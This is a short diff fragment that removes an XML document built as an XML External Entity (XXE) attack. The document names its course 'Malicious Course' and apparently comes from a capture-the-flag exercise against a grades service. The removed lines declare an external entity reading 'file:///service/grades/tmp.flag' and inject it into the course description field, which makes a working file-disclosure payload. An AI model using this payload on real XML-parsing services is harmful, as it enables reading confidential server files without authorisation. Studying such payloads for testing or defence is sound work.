@@ -1,8 +1,0 @@
-<!DOCTYPE data [
-    <!ENTITY xxe SYSTEM "file:///service/grades/tmp.flag">
-]>
-<data>
-    <course>
-        <name>Malicious Course</name>
-        <description>&xxe;</description>
-    </course>
